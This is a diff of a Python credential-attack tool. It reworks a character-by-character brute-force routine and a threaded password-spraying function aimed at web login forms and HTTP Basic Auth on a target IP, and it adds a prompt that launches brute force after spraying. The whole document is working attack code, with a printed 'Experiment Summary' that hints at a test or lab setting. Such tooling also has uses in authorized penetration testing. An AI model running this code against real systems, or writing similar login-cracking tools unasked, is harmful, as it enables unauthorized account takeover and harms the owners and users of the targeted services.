@@ -400,57 +400,63 @@ def generate_password_variants(password):
 def perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check, delay=1):
     """
     Performs brute force attempts on login forms or BasicAuth with a time delay between each attempt.
-
-    Args:
-        username_file (str): Path to the username file.
-        password_file (str): Path to the password file.
-        ip_address (str): IP address of the target.
-        criteria (dict): Criteria for usernames and passwords.
-        session (Session): Session object to maintain cookies across requests.
-        pages_to_check (list): List of pages to attempt brute force on.
-        delay (int): Time delay (in seconds) between each brute force attempt.
     """
     print(f"{Fore.YELLOW}Starting brute force attack...{Style.RESET_ALL}")
+
+    # Extract min_len and max_len from criteria
+    min_len = criteria.get('password_min_len', 1)  # Default to 1 if not specified
+    max_len = criteria.get('password_max_len', 8)  # Default to 8 if not specified
+
+    # Define the character set for brute-forcing
+    bruteforce_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
 
     # Load and filter usernames
     with open(username_file, 'r') as user_file:
         usernames = [line.strip() for line in user_file.readlines()]
-    # Bruteforce each password length and combination
+
+    # Pre-check authentication requirements for each page
+    auth_type = {}
+    for page in pages_to_check:
+        full_url = urljoin(f'http://{ip_address}', page)
+        if is_password_requested_basic_password_field(full_url, session):
+            auth_type[full_url] = "password_field"
+        elif is_password_requested_basic_auth(full_url, session):
+            auth_type[full_url] = "basic_auth"
+        else:
+            auth_type[full_url] = None  # No authentication required
+
+    # Remove pages without authentication requirements
+    pages_to_check = [url for url, auth in auth_type.items() if auth is not None]
+
+    # Brute force each password length and combination
     for length in range(min_len, max_len + 1):
         try:
             for password_tuple in itertools.product(bruteforce_chars, repeat=length):
                 bruteforce_password = ''.join(password_tuple)
                 print(f"{Fore.WHITE}Trying brute-force password: {bruteforce_password}{Style.RESET_ALL}")
-                
+
                 # Attempt login with each username and the generated brute-force password
-                for page in pages_to_check:
-                    full_url = urljoin(f'http://{ip_address}', page)
-                    credentials_found = False  # Flag to stop further attempts once successful
-                    
-                    # Check for either a password field or BasicAuth requirement
-                    if is_password_requested_basic_password_field(full_url, session) or is_password_requested_basic_auth(full_url, session):
-                        for username in usernames:
-                            # Attempt form-based login if password field is present
-                            if is_password_requested_basic_password_field(full_url, session):
-                                credentials = attempt_login_with_form(full_url, session, username, bruteforce_password)
-                            
-                            # Attempt BasicAuth if BasicAuth is required
-                            elif is_password_requested_basic_auth(full_url, session):
-                                response = session.get(full_url, auth=HTTPBasicAuth(username, bruteforce_password))
-                                if response.status_code == 200:
-                                    credentials = (username, bruteforce_password)
-                                else:
-                                    credentials = None
-                            
-                            # If successful, print and return
-                            if credentials:
-                                print(f"{Fore.GREEN}Success! Username: {credentials[0]}, Password: {credentials[1]} on {full_url}")
-                                return  # Stop after the first successful brute-force
-        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, urllib3.exceptions.ProtocolError, ConnectionResetError) as e:     
+                for full_url in pages_to_check:
+                    for username in usernames:
+                        if auth_type[full_url] == "password_field":
+                            credentials = attempt_login_with_form(full_url, session, username, bruteforce_password)
+                        elif auth_type[full_url] == "basic_auth":
+                            response = session.get(full_url, auth=HTTPBasicAuth(username, bruteforce_password))
+                            credentials = (username, bruteforce_password) if response.status_code == 200 else None
+
+                        # Delay to avoid overwhelming the server
+                        time.sleep(delay)
+
+                        # If successful, print and return
+                        if credentials:
+                            print(f"{Fore.GREEN}Success! Username: {credentials[0]}, Password: {credentials[1]} on {full_url}")
+                            return
+        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, urllib3.exceptions.ProtocolError, ConnectionResetError) as e:
             print("Connection Error, waiting for 1 second")
             time.sleep(1)
         except requests.exceptions.RequestException as e:
             print(f"An error occurred: {e}")
+
 
                         
 # Helper function to check if the response contains a login form
@@ -531,51 +537,55 @@ def password_field_spray(full_url, password, username, session, successful_crack
     except RequestException as e:
         print(f"An error occurred: {e}")
 
-
 def single_spray(full_url, passwords, usernames, session, successful_cracks, failed_cracks):
     global total_pages_field, total_attempts, successful_attempts
-# Check if the page has a password field (form-based authentication)
-    if is_password_requested_basic_password_field(full_url, session):
-        #Bar usage from https://stackoverflow.com/questions/3002085/how-to-print-out-status-bar-and-percentage
-        bar = progressbar.ProgressBar(maxval=(len(passwords)*len(usernames)),
-        widgets=[progressbar.Bar('=', '[', ']'), ' ', progressbar.Percentage()])
-        bar.start()
-        count = 0
-        total_pages_field +=1
-        for password in passwords:
-            threads = []
-            for username in usernames:
-                count +=1
-                bar.update(count)
+    
+    # Dictionary to store authentication type for each URL
+    auth_type = {}
+
+    # Check for authentication requirements only once per URL
+    if full_url not in auth_type:
+        if is_password_requested_basic_password_field(full_url, session):
+            auth_type[full_url] = "password_field"
+            total_pages_field += 1
+        elif is_password_requested_basic_auth(full_url, session):
+            auth_type[full_url] = "basic_auth"
+            total_pages_field += 1
+        else:
+            auth_type[full_url] = None  # No authentication required
+
+    # If no authentication required, skip the URL
+    if auth_type[full_url] is None:
+        print(f"No authentication required on {full_url}. Skipping...")
+        return
+
+    # Progress bar for brute-forcing
+    # Bar usage from https://stackoverflow.com/questions/3002085/how-to-print-out-status-bar-and-percentage
+    bar = progressbar.ProgressBar(maxval=(len(passwords) * len(usernames)),
+                                  widgets=[progressbar.Bar('=', '[', ']'), ' ', progressbar.Percentage()])
+    bar.start()
+    count = 0
+
+    for password in passwords:
+        threads = []
+        for username in usernames:
+            count += 1
+            bar.update(count)
+
+            if auth_type[full_url] == "password_field":
                 tsub = Thread(target=password_field_spray, args=(full_url, password, username, session, successful_cracks, failed_cracks))
-                threads.append(tsub)    
-            for thread in threads:
-                thread.start()
-            for thread in threads:   
-                thread.join()
-        bar.finish()
-
-    if is_password_requested_basic_auth(full_url, session):
-        #Bar usage from https://stackoverflow.com/questions/3002085/how-to-print-out-status-bar-and-percentage
-        bar = progressbar.ProgressBar(maxval=(len(passwords)*len(usernames)),
-        widgets=[progressbar.Bar('=', '[', ']'), ' ', progressbar.Percentage()])
-        bar.start()
-        count = 0
-        total_pages_field +=1
-        for password in passwords:
-            threads = []
-            for username in usernames:
-                count +=1
-                bar.update(count)
+            elif auth_type[full_url] == "basic_auth":
                 tsub = Thread(target=basic_auth_spray, args=(full_url, password, username, session, successful_cracks, failed_cracks))
-                threads.append(tsub)    
-            for thread in threads:
-                thread.start()
-            for thread in threads:   
-                thread.join()
-        bar.finish()
 
+            threads.append(tsub)
 
+        # Start threads
+        for thread in threads:
+            thread.start()
+        for thread in threads:
+            thread.join()
+
+    bar.finish()
 
 # Modify the password_spraying function to include bruteforce and character substitution
 def password_spraying(ip_address, username_file, password_file, criteria):
@@ -636,6 +646,10 @@ def password_spraying(ip_address, username_file, password_file, criteria):
             print(f"{Fore.WHITE}Page: {page}, Username: {user}, Password: {pwd}")
     else:
         print(f"{Fore.RED}No successful cracking attempts.")
+    # Offer brute-force option
+    if ask_for_bruteforce():
+        print("Performing brute-force attack...")
+        perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check)
 
     # Experiment Summary
     print(f"{Fore.YELLOW}\n======== Experiment Summary ========{Style.RESET_ALL}")
